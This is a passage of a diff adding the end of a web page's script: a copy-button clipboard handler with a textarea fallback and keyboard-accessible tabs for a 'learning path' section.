+        navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(false); });
+      } else {
+        var ta = document.createElement("textarea");
+        ta.value = text;
+        ta.setAttribute("readonly", "");
+        ta.style.position = "fixed";
+        ta.style.left = "-9999px";
+        document.body.appendChild(ta);
+        ta.select();
+        var ok = false;
+        try { ok = document.execCommand("copy"); } catch (err) { ok = false; }
+        document.body.removeChild(ta);
+        done(ok);
+      }
+    });
+
+    wrap.appendChild(btn);
+  });
+
+  /* ---------- 3. 学习路线 tabs ---------- */
+  Array.prototype.slice.call(document.querySelectorAll("[data-tabs]")).forEach(function (group) {
+    var tabs = Array.prototype.slice.call(group.querySelectorAll('[role="tab"]'));
+    function select(tab) {
+      tabs.forEach(function (t) {
+        var on = t === tab;
+        t.setAttribute("aria-selected", on ? "true" : "false");
+        t.tabIndex = on ? 0 : -1;
+        var panel = document.getElementById(t.getAttribute("aria-controls"));
+        if (panel) panel.hidden = !on;
+      });
+    }
+    if (tabs.length) select(tabs[0]);
+    tabs.forEach(function (tab, i) {
+      tab.tabIndex = i === 0 ? 0 : -1;
+      tab.addEventListener("click", function () { select(tab); });
+      tab.addEventListener("keydown", function (e) {
+        var next = null;
+        if (e.key === "ArrowRight") next = tabs[(i + 1) % tabs.length];
+        if (e.key === "ArrowLeft") next = tabs[(i - 1 + tabs.length) % tabs.length];
+        if (e.key === "Home") next = tabs[0];
+        if (e.key === "End") next = tabs[tabs.length - 1];
+        if (next) { e.preventDefault(); select(next); next.focus(); }
+      });
+    });
+  });
+
+  apply();
+})();
+</script>
+</body>
+</html>
